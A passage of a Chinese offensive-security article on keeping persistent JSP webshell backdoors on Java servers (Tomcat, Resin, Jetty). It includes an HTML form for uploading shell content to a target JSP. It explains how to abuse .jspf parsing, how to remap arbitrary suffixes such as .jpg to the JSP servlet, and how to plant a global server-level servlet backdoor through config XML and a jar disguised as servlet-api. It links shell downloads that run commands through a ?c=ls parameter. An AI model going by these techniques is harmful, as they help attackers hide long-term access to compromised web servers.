<html> <head> <meta http-equiv="content-type" content="text/html;charset=utf-8"> <title>jsp-yzmm</title> </head> <style> .main{width:980px;height:600px;margin:0 auto;} .url{width:300px;} .fn{width:80px;} .content{width:80%;height:60%;} </style> <script>   function upload(){     var url = document.getElementById('url').value,       content = document.getElementById('content').value,       fileName = document.getElementById('fn').value,       form = document.getElementById('fm');     if(url.length == 0){       alert("Url not allowd empty!");       return ;     }     if(content.length == 0){       alert("Content not allowd empty!");       return ;     }     if(fileName.length == 0){       alert("FileName not allowd empty!");       return ;     }     form.action = url;     form.submit();   } </script> <body> <div class="main">   <form id="fm" method="post">       URL:<input type="text" value="http://localhost/Struts2/css3.jsp" class="url" id="url" />&nbsp;&nbsp;     FileName:<input type="text" name="f" value="css.jsp" class="fn" id="fn" />&nbsp;&nbsp;     <a href="javascript:upload();">Upload</a><br/>     <textarea id="content" class="content" name="t" ></textarea>   </form> </div> </body> </html>
```

[http://xsser.me/caidao/getshell-by-logger.jsp](http://xsser.me/caidao/getshell-by-logger.jsp)

 [http://xsser.me/caidao/getshell-by-logger.txt](http://xsser.me/caidao/getshell-by-logger.txt)

## 0x03 jspf后门

---

在Resin的配置文件conf/app-default.xml看到了几个可以用jsp方式去解析的后缀，其中就包含了jspf和上面的jspx： ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/c524696b4e4b6cfb7956a433bbd8881203c7a81a.jpg)

其中的resin-jsp和resin-jspx差不多，都是com.caucho.jsp.JspServlet处理，知识后者在init标签中标明了是以xml方式解析：`<xml>true</xml>`。

百度了下此jspf非框架（Java Simple Plugin Framework），JSP最新的规范已经纳入了jspf为JSP内容的文件。但是经过测试主流的JavaServer仅有resin和jetty支持，tomcat等server并不支持。不过在实际的生产环境上resin用的非常广泛。至于jetty略少，不过貌似bae是用的jetty。

直接把css.jsp文件改名为1.jspf请求即可看到成功调用菜刀接口：  
 ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/294a0f5de82efce78eb32bc20702afbe403e8e48.jpg)

## 0x04 邪恶后门第一式-恶意的任意后缀解析

---

从Tomcat和Resin的配置当中可以看出来，其实脚本可以是任意后缀，只要在配置解析的地方修改下映射的后缀就行了。那么只要修改下配置文件中后缀映射为jsp对于的解析的servlet名字就可以轻松的留下一个“不同寻常”的后缀的后门了。我测试Tomcat6/8和Resin3发现：一个运行当中的server当修改他们的映射的文件后不需要重启即可自动生效。也就是说可能一个网站存在跨目录的文件编辑漏洞，只要找到对于的配置文件地址修改后就能访问1.jpg去执行恶意的jsp脚本，这听起来有点让人不寒而栗。Getshell后只要把这配置文件一改丢个jpg就能做后门了。

### Tomcat修改conf/web.xml：

￼ ![enter image description here](http://drops.leesec.com/wooyun-img/d4c2833ca54aed5bf9cd2002d6b6147a78db8498.jpg)

### Resin修改conf/app-default.xml：

￼ ![enter image description here](http://drops.leesec.com/wooyun-img/ce90fb7172bfba8bd005c755e84467600a8f0dfc.jpg)

## 0x05 邪恶第二式-“变态的server永久后门”

---

如果说修改某些不起眼的配置文件达到隐藏后门足够有意思的话，那么直接把后门“藏到Server里面”可能更隐蔽。

在之前攻击Java系列教程中就已经比较详细的解释过Java的Server以及servlet和filter了。其实server启动跟启动一个app应用是非常相似的，我们需要做的仅仅是把servlet或者filter从应用层移动到server层，而且可以做到全局性。这种隐藏方法是极度残暴的，但是缺点是需要重启Server。假设在一台Server上部署了N个应用，访问任意一个应用都能获取Webshell。http://ip/xxx就是后门了。没明白？上demo。

### Tomcat5配置方式：

在`apache-tomcat-5.5.27\conf\web.xml`的session-config后面加上一个filter或者servlet即可全局过滤：

```xml
    <servlet>        <servlet-name>HttpServletWrapper</servlet-name>        <servlet-class>javax.servlet.web.http.HttpServletWrapper</servlet-class>    </servlet>     <servlet-mapping>        <servlet-name>HttpServletWrapper</servlet-name>        <url-pattern>/servlet/HttpServletWrapper</url-pattern>    </servlet-mapping>
```

url-pattern表示默认需要过滤的请求后缀。

需要把jar复制到tomcat的lib目录，项目启动的时候会自动加载jar的filter或者filter。  
 ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/866d5ce6a33b87aa80f15906c6522c7208069cfb.jpg)

Resin配置需要修改`E:\soft\resin-pro-3.1.13\conf\app-default.xml`，在resin-xtp的servler后面加上对应的filter或者servlet并把`E:\soft\resin-pro-3.1.13\lib`放入后门的jar包：  
 ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/b535253e986c7aeef34bdf0741c3a6901417c7c9.jpg)

Jetty配置，修改`D:\Soft\Server\jetty-distribution-9.0.5.v20130815\etc\webdefault.xml`文件，在default的servlet之前配置上面的filter和servler配置。

Jar包：`E:\soft\jetty-distribution-9.0.4.v20130625\lib`

其他的Server就不列举了差不多。servlet和filter配置也都大同小异知道其中的一种就知道另一种怎么配置了。

servlet-api-3.04.jar是我伪装的一个后门， jar下载地址：[http://pan.baidu.com/s/17mKbH](http://pan.baidu.com/s/17mKbH)

对应的后门HttpServletWrapper.java下载地址：[http://pan.baidu.com/s/1l8eiM](http://pan.baidu.com/s/1l8eiM)

## 0x06 其他后门

---

### 1、javabean

[http://blogimg.chinaunix.net/blog/upfile2/090713181535.rar](http://blogimg.chinaunix.net/blog/upfile2/090713181535.rar)

用法：把beans.jsp传到网站根目录，把beans.class传到"\webapp\WEB-INF\classes\linx"目录。

再访问

[http://xxxxxx.com/webapp/beans.jsp?c=ls](http://xxxxxx.com/webapp/beans.jsp?c=ls)

### 2、servlet

[http://blogimg.chinaunix.net/blog/upfile2/090713181617.rar](http://blogimg.chinaunix.net/blog/upfile2/090713181617.rar)

用法：把文件传到"\webapp\WEB-INF\classes"目录，访问

[http://xxxxxx.com/webapp/servlet/servlets?c=ls](http://xxxxxx.com/webapp/servlet/servlets?c=ls)

如果无法打开，请参考

[http://blog.csdn.net/larmy888/archive/2006/03/02/613920.aspx](http://blog.csdn.net/larmy888/archive/2006/03/02/613920.aspx)

### 3、编译执行型后门

上传一个java文件编译并执行，通过socket方式可做后门。一般来说Server的loader在启动后不会再去加载新增的jar或者class文件，如果想自动加载新的class文件可能需要根据不同的Server去改配置。Tomcat下配置的时候经常有人会reloadable="true"这样就有机会动态去加载class文件。可以根据Server去留一些有意思的后门。

 [http://xsser.me/caidao/getshell-by-logger.txt](https://blog.csdn.net/Fly_hps/article/details/80362449)